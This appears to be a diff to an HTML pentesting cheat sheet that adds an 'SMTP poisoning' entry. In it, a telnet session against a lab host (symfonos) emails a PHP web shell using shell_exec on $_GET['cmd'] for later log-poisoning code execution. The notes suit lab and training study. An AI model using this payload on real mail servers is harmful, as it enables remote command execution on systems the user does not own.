@@ -162,7 +162,7 @@ echo "Done"</pre>
                 </tr>
                 <tr>
                     <td>Select a location to copy file to</td>
-                    <td>Site cpto /&lt;remote directory to copy file to&gt;</td>
+                    <td>Site cpto &lt;remote directory to copy file to&gt;</td>
                 </tr>
             </table>
         </li>
@@ -201,6 +201,39 @@ echo "Done"</pre>
 </table>
 
 <h2>25 TCP / SMTP</h2>
+
+<ul>
+    <li>Simple Mail Transfer Protocol
+        <ul>
+            <li>Sends mail</li>
+            <li>On internal networks you can typically send emails as anybody</li>
+            <li>SMTP poisoning
+                <pre>
+                     telnet 10.0.0.12 25
+Trying 10.0.0.12...
+Connected to 10.0.0.12.
+Escape character is '^]'.
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+HELO example.com
+250 symfonos.localdomain
+mail from: hacker@example.com
+250 2.1.0 Ok
+rcpt to: helios@symfonos.localdomain
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
+subject: 
+&lt;?php echo shell_exec($_GET['cmd]); ?&gt;
+.
+250 2.0.0 Ok: queued as 8A6884082B
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
+                </pre>
+            </li>
+        </ul>
+    </li>
+</ul>
 
 </body>
 </html>
